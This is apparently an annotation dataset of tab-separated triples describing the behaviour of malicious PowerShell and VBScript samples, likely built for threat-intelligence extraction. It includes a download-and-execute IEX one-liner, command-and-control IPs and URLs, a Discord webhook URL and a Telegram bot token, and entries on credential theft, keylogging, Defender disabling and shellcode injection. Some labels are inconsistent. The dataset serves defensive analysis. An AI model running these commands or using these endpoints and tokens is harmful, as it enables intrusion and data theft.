DropBox-Upload function	COMMAND	Have	hardcoded Dropbox access token	PARAMETER
The script	SUB	Contain	LONG_BYTE_SEQUENCE	DATA
command-line arguments	COMMAND	Have	-exc Bypass	PARAMETER
vbs files	EXE	Saved	C:\Users\Public\Music	PATH
The script	SUB	Set	cookie with random value	COOKIE
The script	SUB	Create	scheduled task 'det'	TASK
The script	SUB	Remove	downloaded zip file	DOWNLOADED FILE
The script	SUB	Create	QPXCNKQPGRJWIWPIQLPDOP.vbs	EXE
The script	SUB	Monitor	Ctrl + C or Ctrl + X key combination	KEYBOARD EVENT
The script	SUB	Set Attribute	xmrig.exe and config.json	EXE
'readme.txt'	FILE	Hosted	'metaphysic' directory	PATH
The script	SUB	Change	UAC consent prompt behavior	PERMISSION
YWGCNHBTTYGDVSHYYNDAIO.bat	EXE	Saved	C:\ProgramData\YWGCNHBTTYGDVSHYYNDAIO	ProgramData PATH
The script	SUB	Create	'C:\Users\Public\Run' folder	PATH
The script	SUB	Use	System.IO.Compression.DeflateStream	COMPRESSION COMMAND
$hBFNIeMq	VARIABLE	CopiedTo	Memory Space	MEMORY
https://example.com/evil.exe	EXE	Hosted	https://example.com	URL
The script	SUB	Upload	System Information	PVI
The script	SUB	Collect	Operating System version	PVI
Invoke-RestMethod cmdlet	Invoke-RestMethod COMMAND	Send	collected private information	PVI
The script	SUB	Check	Global\AlreadyRunning19122345	MUTEX
The script	SUB	Execute	XX.vbs	EXE
The script	SUB	Wait	4.5 minutes	TIME
The script	SUB	Use	System.IO.StreamReader	StreamReader WAPI
The script	SUB	Create	scheduled task	TASK
powershell -NoP -sta -w 1 -enc <encoded_command>	PS COMMAND	Have	-w 1	BYPASS PARAMETER
batch file 1.bat	EXE	Execute	PowerShell script imcq.ps1	EXE
The script	SUB	Execute	remote commands	COMMAND
Invoke-WebRequest	COMMAND	Download	file.exe	EXE
The script	SUB	Include	sleep commands	SLEEP
The script	SUB	Create	batch script	EXE
scheduled task	TASK	Have	TaskAction	COMMAND
https://root-head.com/2708.bs64	URL	Have	Base64 encoded payload	OBF
The script	SUB	Execute	curl	EXE
The script	SUB	Create	mvfp.ps1	EXE
The script	SUB	Have	obfuscated variable names	OBF
The script	SUB	Have	$rNAjWamiWZfJuX	OBF
The script	SUB	Download	https://dl.dropboxusercontent.com/s/lpoe7mktxd3zi1r/ps1.txt	FILE
The script	SUB	Execute	Start-Process	SLEEP
The script	SUB	Download	decapodvsWW.exe	EXE
The script	SUB	Wait	3 seconds	TIME
The script	SUB	Execute	Insidious.exe	EXE
Invoke-Expression	IEX COMMAND	Have	-ExecutionPolicy	BYPASS PARAMETER
The script	SUB	Execute	method 'Execute'	FUNCTION
The script	SUB	Create	ZIP files	COMPRESSED FILE
The script	SUB	Collect	Local IP address	PVI
script	SUB	Save	captured images	PVI
The script	SUB	Use	Base64 encoded strings	OBF
dynamic assemblies	ASSEMBLY	Use	DefineDynamicModule	FUNCTION
IEX (New-Object Net.WebClient).DownloadString	COMMAND	Have	DownloadString	Download COMMAND
The script	SUB	Lack	user interaction	ACTION
The script	SUB	Download	tr.zip	COMPRESSED FILE
The script	SUB	Use	hardcoded Discord webhook URL	URL
VBScript	EXE	Execute	XX.bat	EXE
The script	SUB	Obfuscate	URL and data	OBF
install.vbs	EXE	Hosted	user's AppData\Roaming\Logs folder	PATH
PowerShell script (Document.ps1)	EXE	Execute	.NET executable	EXE
a1f5abfa214411baa77e25f6ceaa6	FUNCTION	Have	True	RANDNAME
Start-KeyLogger	COMMAND	Have	Keylogging functionality	PVI
custom function go	FUNCTION	Convert	hexadecimal strings into byte arrays	ACTION
C:\ProgramData\YWGCNHBTTYGDVSHYYNDAIO	PATH	Hosted	YWGCNHBTTYGDVSHYYNDAIO.ps1	EXE
decapodvsWW.exe	EXE	Hosted	https://www.shalom.pt/50/	URL
.NET assembly	ASSEMBLY	Download	**LONG_BYTE_SEQUENCE**	OBF
scheduled tasks	TASK	Execute	VsLabs.vbs	EXE
The script	SUB	Connect	10.0.0.1	IP
The script	SUB	Download	an external URL	URL
The script	SUB	Delete	scheduled task 'det'	TASK
scheduled task 'Express'	TASK	Execute	Cotrl.vbs	EXE
$YHYA	VAR	Have	Base64 string	OBF
Computer name	PVI	Uploaded	http://51.132.148.124/brume.php	URL
The script	SUB	Decode	long byte sequence	OBF
The script	SUB	Connect	3HHHHHHHHHHHHHHHHHHHHH112HHHHHHHHHHHHHHHHHHHHHHH173HHHHHHHHHHHHHHHHHHHHH17/ASSYServerHHHHHHHHHHHHHHHHHHHHHHHtxt	URL
The script	SUB	Terminate	*powershell*	PROCESS
The script	SUB	Have	$AQWWVnJxQcAhqzyGgu	CUSTOMIZED PARAMETER
Invoke method	FUNCTION	Execute	command with byte array	COMMAND WITH DATA
The script	SUB	Check	certain value in specific memory locations	MEMORY
Start-Process	Start-Process COMMAND	Have	NoNewWindow	BYPASS PARAMETER
The script	SUB	Create	C:\ProgramData\TBFLVIISWLYQJRIYEDPLGO	ProgramData PATH
$XyybdfuQWuefStm	OBF	Decrypted	powershell scripts	PS COMMAND
The script	SUB	Download	a file	FILE
http://ozzoeyi/index.php?5964824458645864581	FILE	Hosted	http://ozzoeyi/index.php?5964824458645864581	URL
The script	SUB	Execute	http://ozzoeyi/index.php?5964824458645864581	FILE
The script	SUB	Execute	RUCXFGHJUCVOFVUZVIPNCG.ps1	EXE
The script	SUB	Write	C:\Users\Owner\AppData\Local\Temp\tmpECC8.tmp	FILE
The script	SUB	Use	RC4 encryption	OBF
The script	SUB	Execute	Clear-PowerShellHistory	Clear-PowerShellHistory COMMAND
PowerShell commands	PS COMMAND	Have	-ExecutionPolicy	Bypass PARAMETER
The script	SUB	Use	AES encryption	OBF
hidden directory	HIDDEN PATH	Host	multiple executable files	EXE
script	SUB	Use	Telegram bot token (7252114865:AAGmlQ0WALjwG2UkRQj8B5LSReMBTAMhfQs)	BOT TOKEN
The script	SUB	Have	base64 encoded string	OBF
security features	ACTION	Include	Windows Firewall	DEFENDER
System.Reflection.Assembly	Reflection.Assembly	Load	Assembly from string	EXE
$xpy	DATA	Loaded	executable memory	MEMORY
The script	SUB	Terminate	*.bat	PROCESS
specific key presses	EVENT	Include	Ctrl + X	KEYBOARD EVENT
Report.ps1	EXE	Decode	LONG_BYTE_SEQUENCE	OBF
The script	SUB	Delete	*.js	FILE
The script	SUB	Perform	Code Injection	ACTION
The script	SUB	Use	-NoE, -NoP, -NonI, -W Hidden	PARAMETER
The script	SUB	Copy	login data file	FILE
The script	SUB	Use	encoded strings	OBF
PowerShell scripts	SUB	Execute	install.vbs	EXE
an assembly	EXE	Have	EntryPoint	ENTRYPOINT TO EXE
PowerShell script	SUB	Have	obfuscated hexadecimal strings	OBF
The script	SUB	Use	WebProxy and Credentials	ACTION
The script	SUB	Modify	registry key for 'socks'	REGKEY
The script	SUB	Have	$ZPWeIhCk	OBF
The script	SUB	Collect	remote server	REMOTE_HOST
The script	SUB	Use	VBScript for Execution	ACTION
The script	SUB	Use	bypass script	EXE
Invoke-Expression	COMMAND	Have	-EncodedCommand	ENCODED PARAMETER
The script	SUB	Create	MINGALIES	PATH
Marshal::Copy	WAPI	COPY	$kgjFavhe	OBF
The script	SUB	Decode	base64-encoded byte sequence	OBF
Start-Process	COMMAND	Have	-FilePath	C:\Windows\System32\cmd.exe	PATH
scheduled task	TASK	Execute	log.vbs	EXE
The script	SUB	Terminate	specific message on Ctrl+Ctrl press	MESSAGE
$pe	VAR	Generated From	$YHYA	VAR
The script	SUB	Connect	62.182.158.156:6666	IP
The script	SUB	Use	Send-DiscordMessage function	Function
The script	SUB	Read/Write	files	FILE
The script	SUB	Obfuscate	Strings and variables	OBF
The script	SUB	Decodes	Base64 string	DATA
The script	SUB	Have	obfuscated strings and variables	OBF
The script	SUB	Create	.lnk file	FILE
Base64 string	OBF	Have	Encoded Command	COMMAND
The script	SUB	Create	MEMEMAN directory	PATH
Encoded Command	COMMAND	Execute	PowerShell	PS COMMAND
The script	SUB	Use	.vbs extension	FILE
WD.bat	EXE	Execute	PowerShell scripts	PS COMMAND
powershell.exe	PS PS COMMAND	Have	-NoProfile -ExecutionPolicy Bypass	BYPASS PARAMETER
The script	SUB	Execute	malicious code	EXE
The script	SUB	Set	$ErrorActionPreference	PARAMETER
KeyLogger	WAPI	Check	log every keystroke	PVI
The script	SUB	Monitor	Ctrl + X	ACTION
PowerShell script	SUB	Use	System.Management	System.Management NAMESPACE
The script	SUB	Create	delegate to execute code	DELEGATE
script	SUB	Invoke	delegate for VirtualAlloc	DELEGATE
code within the assembly	ASSEMBLY	Call	main function from SharpPrintNightmare.Program	FUNCTION
The script	SUB	Execute	YWGCNHBTTYGDVSHYYNDAIO.ps1	EXE
The script	SUB	Change	Registry	REGKEY
The script	SUB	Execute	start-sleep	SLEEP
The script	SUB	Allocate	memory location	MEMORY
scheduled task	ACTION	Execute	VBScript file (BT.vbs)	EXECUTE
The script	SUB	Download	a base64 encoded data	OBF
notepad.exe	EXE	Overwrites	legitimate system file	FILE
script	SUB	Create	scheduled task (TvMusic2)	TASK
The script	SUB	Create	sqmapi.vbs in C:\ProgramData\WindowsHost\	FILE
The script	SUB	Extract	zip file	COMPRESSED FILE
The script	SUB	Write	VBScript file (BT.vbs)	EXE
The script	SUB	Have	Encoded Script	OBF
A downloaded file	EXE	Downloaded	a remote location (Discord CDN link)	URL
qgame_tim and qqgame_gg functions	FUNCTION	Use	decoded byte array	DATA
scheduled task (TvMusic2)	TASK	Execute	TvMusic.vbs	EXE
Base64 string	OBF	Contain	Invoke-WebRequest	Invoke-WebRequest COMMAND
The script	SUB	Have	WindowsBase and PresentationCore .NET assemblies	NET ASSEMBLY
The script	SUB	Create	$uzLJuErm	CUSTOMIZED PATH
The script	SUB	Have	-enc	PARAMETER
The script	SUB	Have	hexadecimal byte arrays	OBF
The script	SUB	Set	persistence cookie	PROPERTY
Invoke-Expression	COMMAND	Have	-EncodedCommand	EncodedCommand PARAMETER
The script	SUB	Create	BT.vbs	EXE
The script	SUB	Load	aspnet_regbrowsers.exe	EXE
The script	SUB	Set	run client32.exe on startup	ACTION
The script	SUB	Check	user's keyboard	PVI
The script	SUB	Execute	Get-LocalUser	COMMAND
Invoke-Expression	COMMAND	Have	-ExecutionPolicy Bypass	PARAMETER
The script	SUB	EXECUTE	remote code	COMMAND
The script	SUB	Wait	thread to finish	LOOP
rundll32.exe	EXE	Load	33667344.dll	DLL
system information	PVI	Include	geolocation data	PVI
The script	SUB	Access	$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data	PATH
The script	SUB	Use	VirtualAlloc	WAPI
The script	SUB	Connect	hoteghnew.blogspot.com////////////////////////////atom.xml	URL
PowerShell	PS COMMAND	Have	in a hidden window	HIDE
$y74gh00rffd	OBF	Have	Base64 Encoding	ACTION
The script	SUB	Create	tmpD994.tmp	FILE
The script	SUB	Write	VBScript file (Document.vbs)	EXE
The script	SUB	Execute	/login/process.php	WEB QUEST
VBScript	EXE	Use	WScript.Shell object	COMMAND
registry key for 'socks'	REGKEY	SetTo	AutoRun	AUTORUN
The script	SUB	Invoke	Telegram API	Telegram API
The script	SUB	Check	Ctrl + Ctrl key press	KEYBOARD EVENT
PowerShell	PS COMMAND	Have	-ExecutionPolicy Bypass -Scope Process -Force	BYPASS PARAMETER
The script	SUB	Upload	Dropbox account	EXTERNAL SERVICE
The script	SUB	Wait	every 15 seconds	TIME
The script	SUB	Execute	r.exe	EXE
remote script	EXE	Hosted	hxxp://example.com/script3.ps1	URL
The script	SUB	React	Ctrl + Ctrl	ACTION
The script	SUB	Execute	file.exe	EXE
The script	SUB	Decrypt	ProtectedData class	DATA
The script	SUB	Execute	start "C:\Users\Public\Music\install.vbs"	EXE
the script	SUB	Check	PowerShell version < 2	Powershell VERSION
The script	SUB	ADD REFERENCE TO	System.Drawing.dll	FILE
PowerShell script	PS COMMAND	Execute	.NET assembly from byte array	NET ASSEMBLY
The script	SUB	Create	New Thread	THREAD
The script	SUB	Executes	code in allocated memory	CODE
code in allocated memory	CODE	Loaded	allocated memory	MEMORY
The script	SUB	Use	AES	ENCRYPTION ALGORITHM
The script	SUB	Collect	geographical location	PVI
'Run.vbs'	EXE	Saved	'C:\Users\Public\Run'	PATH
The script	SUB	Create	'YWGCNHBTTYGDVSHYYNDAIO.ps1'	EXE
XX.bat	EXE	Use	-ExecutionPolicy Bypass	BYPASS PARAMETER
The script	SUB	Have	Base64 encoded strings	OBF
The script	SUB	Collect	operating system version	PVI
'adobe.zip'	COMPRESSED FILE	Downloaded From	178.62.96.159	IP ADDRESS
The script	SUB	Use	VirtualAlloc	WAPI
new thread	THREAD	Execute	$MHilluFsD	PAYLOAD
The script	SUB	Have	-win hid	BYPASS PARAMETER
The script	SUB	Connect	hardcoded server IP address	IP ADDRESS
The script	SUB	Use	WaitForSingleObject	WaitForSingleObject WAPI
The script	SUB	Create	directory in C:\ProgramData\WD	ProgramData PATH
The script	SUB	Download	20200510.rar	COMPRESSED FILE
The script	SUB	Connect	https://discord.com/api/webhooks/1283930910772957224/R3XHJxVUKh-r3ecRq9or29O3EkiHhFu4jHsfPK6ezDzIN7tW4Pkv_zCNy8Sn2Df-04ak	URL
The script	SUB	Change Directory	user's AppData folder	USER APPDATA PATH
rNTw8v4l	KEY	ReferTo	TravellingPositions_nopump.exe	EXE
If the address of the exception matches the address of the function 'Ascanner'	MEMORY_ADDRESS_MATCH	Execute	"handler"	FUNCTION
The script	SUB	Execute	Unknown PE	EXE
The script	SUB	Create	install.ps1	EXE
clipboard data	PVI	SentTo	remote server	REMOTE HOST
The script	SUB	Have	sleep intervals	SLEEP
new thread	THREAD	Execute	x86 assembly code in memory	CODE
The script	SUB	Execute	-WindowStyle hidden	BYPASS PARAMETER
The script	SUB	Execute	Dropbox API	ACTION
The script	SUB	Loop	infinite loop	LOOP
keylogger	COMMAND	Collect	key presses	PVI
README.txt	FILE	Hosted	user's desktop	PATH
VirtualAlloc	WAPI	Create	memory space	MEMORY
.BAT file	EXE	Hosted	C:\Users\Public\Run	PATH
PowerShell process	PROCESS	Have	suppressed error dialogs	suppressed error dialogs
shellcode	OBF	Copied into	allocated memory	MEMORY
GoogleUpdate.ps1	EXE	Hosted	https://invitadoscarlsjr.mx/.POP/.B.jpg	URL
The script	SUB	Connect	http://hpsj.firewall-gateway.net:80/	URL
The script	SUB	Contact	attacker's email address	URL
The script	SUB	Connect	50.62.182.1	URL
The script	SUB	Save	CorSym.ps1	EXE
The script	SUB	Connect	http://smart.com-coffee.click/trash/bone/show.php	URL
The script	SUB	Inject	RegSvcs.exe	PROCESS
The script	SUB	Use	$RecentGranita	PARAMETER
The script	SUB	Executes	Sleep 5	SLEEP
The script	SUB	Read	ReadToEnd	WAPI
The script	SUB	Create	batch file (JJVXCDAUCHAIHBIEPXDBCS.bat)	EXE
ZIP archive	FILE	UploadedTo	Dropbox	EXTERNAL SERVICE
The script	SUB	Use	XOR Encryption	FUNCTION
[ab821408b424418fa94bb4d815b4e.ad0682a943e4859ef35309cc0a537]	NAMESPACE	Have	True	RANDNAME
The script	SUB	Create	1.bat	EXE
Modify a registry	Action	Disable	AMSI	DEFENDER
The script	SUB	Create	XX.bat	EXE
batch script	EXE	Execute	JZKPPKGTHBOIPSRKOCOKSH.ps1	EXE
VBScript file at C:\Users\Public\Smart.vbs	EXE	Have	obfuscated content	OBF
The script	SUB	Load as Assembly	modified file	FILE
custom encryption function	OBF	Called	DOf3ghXcVf	FUNCTION
Reflective DLL Injection	DLL INJECTION	Have	VirtualAlloc	WAPI
The script	SUB	Execute	XX.bat	EXE
The script	SUB	Execute	VBScript	EXE
The script	SUB	Execute	the downloaded file	EXE
The script	SUB	Monitor	Ctrl + c or Ctrl + x key press	EVENT
Decrypted payload	DATA	CopiedTo	the allocated memory by VirtualAlloc	MEMORY
VirtualAlloc	WAPI	Create	memory	MEMORY
The script	SUB	Access	Windows\Micr	SYSTEM PATH
Persistent Connection	ACTION	Allows	Receive and Execute Commands	ACTION
The script	SUB	Create	C:\Users\Public\Run\New.vbs	PATH
The script	SUB	Hide	javae.exe	PROCESS
decoded string	DATA	Use	Add-Type	-TypeDefinition	DYNAMIC COMPILE
payload	DATA	Into	running process	PROCESS
The script	SUB	Check	the decrypted data starts with the Unicode Byte Order Mark (BOM)	DATA starts with the Unicode Byte Order Mark (BOM)
The script	SUB	Execute	a downloaded file	EXE
The script	SUB	Connect	'http://3HHHHHHHHHHHHHHHHHHHHH112HHHHHHHHHHHHHHHHHHHHH173HHHHHHHHHHHHHHHHHHHHH17/ASYYServerHHHHHHHHHHHHHHHHHHHHHtxt'	URL
The script	SUB	Execute	powershell scripts	EXE
The script	SUB	Download	http://85.192.63.184/s.exe	EXE
remote commands	COMMAND	Have	Invoke-Expression	COMMAND
The script	SUB	Execute	YWGCNHBTTYGDVSHYYNDAIO.vbs	EXE
The script	SUB	Create	Run.vbs	EXE
The script	SUB	Decrypt	p9d2s.exe	EXE
PowerShell script	PS COMMAND	Execute	hidden window	BYPASS PARAMETER
The script	SUB	Use	Base64 Encoding and Decoding	METHOD
The script	SUB	Execute	TvMusic.vbs	EXE
The script	SUB	Collect	username	PVI
Start-Process cmdlet	COMMAND	Execute	Processes	PROCESS
$.ReadToEnd()	COMMAND	Indicates	reading exfiltrated data	ACTION
The script	SUB	Download	config.json	FILE
scheduled task "Data"	TASK	Execute	install.vbs	EXE
The script	SUB	Use	void operator	OBF
The script	SUB	Execute	InstallUtil.exe	COMMAND
The script	SUB	Send	the same unknown URL	URL
The script	SUB	Write	log.vbs	EXE
PowerShell script	SUB	Use	System.IO.Compression.GzipStream	COMPRESSION API
arguments	PARAMETER	ReferTo	jsc.exe	COMMAND
The script	SUB	Have	-EP bypass	BYPASS PARAMETER
script	SUB	Have	$JFmAXPFHnGfI	OBF
The script	SUB	Connect	http://45.89.125.189/put	URL
The script	SUB	Connect	45.82.69.203:443	IP
The script	SUB	Encode	$GSZDYabcRPKLoT	OBF
The script	SUB	Reference	System.Windows.Forms	Windows FORM LIBRARY
registry key	REGKEY	Is	HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\<random_string>	KEYVALUE
install.ps1	EXE	Hosted	user's AppData\Roaming\Logs folder	PATH
The script	SUB	Execute	loop through browser paths	LOOP
The script	SUB	Execute	VBoxSVC.exe	EXE
The script	SUB	Have	$hook	OBF
The script	SUB	Encrypt	payloads in install.vbs	OBF
The script	SUB	Use	custom encryption algorithm	ALGORITHM
delegate	ENTITY	Used for	execute code	ACTION
The script	SUB	Execute	Isass.exe	EXE
The script	SUB	Download	garold.zip	ZIPPED FILE
The script	SUB	Have	obfuscation techniques	OBF
The script	SUB	Access	HKCU:\Software\Microsoft\Windows\CurrentVersion\Run	REGKEY
system information	PVI	Include	computer name	PVI
Run.BAT	FILE	Have	command to download and run another file	COMMAND
The script	SUB	Collect	Distributed COM users	PVI
The script	SUB	Execute	Start-Job	COMMAND
BT.vbs	EXE	Write	disk	PATH
scheduled task	TASK	Execute every	3 minutes	FREQUENCY
The script	SUB	Use	Sleep function	SLEEP
QJAMsrpfhk	NAMESPACE	Have	HH	CLASS
The script	SUB	Have	-WindowStyle Hidden	BYPASS PARAMETER
The script	SUB	Disable	certain Windows Defender exclusions	DEFENDER
The script	SUB	Kill	PowerShell process	PROCESS
PowerShell command	PS COMMAND	Execute	downloaded file	EXE
The script	SUB	Collect	system information	PVI
The script	SUB	Write	$outputFile	FILE
Loader.vbs	EXE	Execute	PowerShell commands	PS COMMAND
The script	SUB	Execute	Start-Sleep	SLEEP
RUCXFGHJUCVOFVUZVIPNCG.ps1	EXE	Decrypt and Execute	payload	DECRYPT
The script	SUB	Save	clipboard data	PVI
Multiple Executions	ACTION	Execute	Invoke-Expression	COMMAND
The script	SUB	Download	a remote file	FILE
The script	SUB	Use	Obfuscated Strings	OBF
The script	SUB	Execute	helper2.exe	EXE
The script	SUB	Execute	string with PowerShell script	PS COMMAND
The script	SUB	Collect	Computer's name	PVI
AutoIt3.exe	EXE	Have	-a script.a3x	PARAMETER
Get-Process	COMMAND	Check	firefox.exe	PROCESS
The script	SUB	OBF	Base64 encoding	OBF
System information	PVI	Includes	Installed software list	FILE
The script	SUB	Have	1000 milliseconds	SLEEP
VirtualAlloc	WAPI	Allocate	executable memory	MEMORY
The script	SUB	EXECUTE	upd.exe	EXE
The script	SUB	Use	GetProcAddress	WAPI
PowerShell command	PS COMMAND	Download	GoogleUpdate.ps1	EXE
The script	SUB	Create	C:\Users\Public\Run\New.vbs	EXE
C:\Users\Public\Run\New.vbs	EXE	Execute	PowerShell command	PS COMMAND
The script	SUB	Maintain	persistence	ACTION
The script	SUB	Have	while ($true) {...}	LOOP
C# code	CODE	Use	kernel32.dll functions	WAPI
The script	SUB	Combine	-join operator	ACTION
Web server	Server	Listen	Incoming connections	ACTION
function 'IGEUWHBKBY'	FUNCTION	Performs	decryption	ACTION
The script	SUB	Disable	Windows Defender Real-Time Protection	DEFENDER
Win32Functions	NAMESPACE	Have	VirtualAlloc	WAPI
PowerShell scripts	SUB	Execute	Loader.vbs	EXE
loop	LOOP	Collect	active window titles	PVI
The script	SUB	Check	strings in the BIOS and GPU information with a list of known virtual machine signatures	VM_SIGNATURE
The script	SUB	Connect	173.247.239.186	IP
Ctrl + c or Ctrl + x key press	EVENT	Trigger	dischat function	FUNCTION
HB function	FUNCTION	Use	Encode and Decode	OBF
decoded data	DATA	Write	agreeBrood.jpg	FILE
The script	SUB	Download	http://20.91.206.86/64bits.php	URL
Invoke-Expression	IEX COMMAND	Combined	files with random names	FILE WITH RANDOM NAME
The script	SUB	Execute	Sleep command	SLEEP
The script	SUB	Have	hexadecimal sequences	OBF
The script	SUB	Execute	Base64 decoded payload	OBF
The script	SUB	Delete	README.txt	FILE
The script	SUB	Access	$env:COMPUTERNAME	ENV PARAMETER
The script	SUB	Create	PasswordVault instance	Instance
The script	SUB	Check Existence	antivirus software executables	DEFENDER
The script	SUB	Create	Batch File	FILE
The script	SUB	Disable	Controlled Folder Access (CFA)	DEFENDER
The script	SUB	Delete	All .lnk files	FILE
Sleep and retry mechanism	SLEEP	Wait	8 seconds	TIME
The script	SUB	Have	Microsoft.VisualBasic	NAMESPACE
delegate zV2s3	FUNCTION	Call	CreateThread	WAPI
The script	SUB	Manipulate	Environment Variables	VARIABLE
The script	SUB	Add	current username	PVI
LONG_BYTE_SEQUENCE	DATA	ChangedTo	URLs	URL
The script	SUB	Write	mezzanines.dll	DLL
func_get_proc_address	FUNCTION	Get	ADDRESS of process	ADDRESS OF PROCESS
The script	SUB	Use	PowerShell	EXE
system information	PVI	Includes	IP address	PVI
WKDXIRNNHFHKNAFGOARGSL.bat	EXE	Execute	WKDXIRNNHFHKNAFGOARGSL.ps1	EXE
The script	SUB	Execute	TBFLVIISWLYQJRIYEDPLGO.vbs	EXE
The script	SUB	Communicate	remote server	EXTERNAL SERVICE
The script	SUB	Have	$book	OBF
The script	SUB	Execute	web request	COMMAND
long byte sequence	OBF	Hosted	The script	SUB
The script	SUB	Add Exclusion	registry key	REGKEY
$UJDSS	VAR	Have	Base64 string	OBF
The script	SUB	Create	PDF.vbs	EXE
scheduled task	TASK	Execute	every 2 minutes	PERIOD
Loader.vbs	EXE	Hosted	user's AppData\Roaming\Logs folder	PATH
decrypted byte sequence	DATA	Loaded	allocated memory	MEMORY
Base64 string	ACTION	Decrypted With	XOR operation (-bxor 35)	COMMAND
$JYeIcaeGeKUCI	OBF	Have	potential shellcode	COMMAND
The script	SUB	Use	Start-Sleep commands	SLEEP
The script	SUB	Write	Loader.vbs	EXE
The script	SUB	Check	PowerShell version >= 5.1	PowerShell version
The script	SUB	Download	https://upds.azureedge.net/update.zip?cn={$env:computername}	COMPRESSED FILE
byte array	OBF	Have	x86 assembly code	CODE
The script	SUB	Connect	https://meet.g...gle.com/	URL
executable memory	MEMORY	Have	0x40 (PAGE_EXECUTE_READWRITE)	ATTRIBUTE
The script	SUB	Delete	The script	SUB
The script	SUB	Place	xx.bat	FILE
The script	SUB	Have	try-catch block	ERR
decoded byte sequence	DATA	Loaded	memory	MEMORY
The script	SUB	Use	IO.Compression.DecompressStream	Method
The script	SUB	Write	.vbs files	EXE
The script	SUB	Send	recovery key	URL
The script	SUB	Upload	stolen files	PVI
The script	SUB	CHANGE	file's execution policy	EXECUTION POLICY
The script	SUB	Execute	Set-MpPreference	COMMAND
dynamic assemblies	ASSEMBLY	Use	DefineDynamicAssembly	FUNCTION
The script	SUB	Enumerate	computer names or IP addresses	PVI
kernel32.dll	LIBRARY	Provides	VirtualAlloc	WAPI
The script	SUB	Define	"Program"	CLASS
iex $text	COMMAND	Execute	remote code	CODE
The script	SUB	Create	a temporary file	EXE
The script	SUB	Change	system's wallpaper	SETTING
The script	SUB	Use	Base64 Encoding and Decoding	OBF
script	SUB	Execute	dynamic .NET type	EXE
PowerShell ISE shortcut	PATH	LocatedIn	user's startup folder	PATH
The script	SUB	Allocates	memory	MEMORY
The script	SUB	Execute	Get-WmiObject	COMMAND
The script	SUB	Decompress	Base64 string	DATA
powershell.exe -c (new-object net.webclient).downloadstring('http://10.0.0.1/share/update.exe') | IEX	PS COMMAND	Execute	Invoke-Expression	COMMAND
powershell.exe -c (new-object net.webclient).downloadstring('http://10.0.0.1/share/update.exe') | IEX	PS COMMAND	Download	update.exe	EXE
The script	SUB	Communicate	archive.soundcast.me:191	URL
PasswordVault instance	Instance	Execute	RetrieveAll()	Function
The script	SUB	Have	Encoded Command	OBF
ADExtract	CODE	Collect	Collected system information	PVI
The script	SUB	Connect	156.96.62.54:4001	IP
The script	SUB	Executes	code at allocated memory address	CODE
The script	SUB	Copy	shellcode	OBF
DATA	DATA	WrittenTo	marqueesInvariance.txt	FILE
The script	SUB	Define	UDXTFLCBTPDTCSEPOVHLIZ	FUNCTION
EPzLaSUIf.bin	FILE	Saved	%temp%	TEMP PATH
The script	SUB	Create Registry Key	ONEN0TEupdate	REGKEY
The script	SUB	Have	String Concatenation	ACTION
The script	SUB	Connect	http://ozzoeyi	URL
The script	SUB	Collect	browser login data	PVI
YWGCNHBTTYGDVSHYYNDAIO.bat	EXE	Created By	The script	SUB
Decompressed data	DATA	Loaded	memory	MEMORY
The script	SUB	Use	kernel32 functions	WAPI
iex	COMMAND	Have	Invoke-Expression	PARAMETER
The script	SUB	Create	Add.ps1	EXE
The script	SUB	Check	the size of IntPtr	SIZE OF POINTER
install.ps1	EXE	Hosted	C:\Users\Public\Music	PATH
The script	SUB	Create	hidden directory (C:\ProgramData\Express)	PATH
The script	SUB	Write	result\Disk.csv	FILE
The script	SUB	Disable	PUA Protection	DEFENDER
user's clipboard	PVI	SentTo	Discord webhook	EXTERNAL SERVICE
Powershell	PS COMMAND	Have	-WIND HIDDEN	BYPASS PARAMETER
The script	SUB	Creates	delegate	ENTITY
dhpS7mQW0xTdFRyQ9wcpnOavwO5mraDdYaNVq883wdR911kpOd1AsVvZGtVSQ43qtfO5Db0AYIsJwA343g7OIClBeoQwLPN2K1fl	FUNCTION	Use	AES Decryption	DESCRYPTION TOOL
The script	SUB	Delete	Sexology.~!!!!!!!!!!!!!!!!~	FILE
The script	SUB	Define	VirtualAlloc	WAPI
The script	SUB	Use	IEX	COMMAND
The script	SUB	Execute	email attachment	FILE
The script	SUB	Create	files	FILE
kernel32.dll	LIBRARY	Have	CreateThread	WAPI
Facexbook.exbxexb	FILE	Hosted	htn8v6pprexbssplayy.com	URL
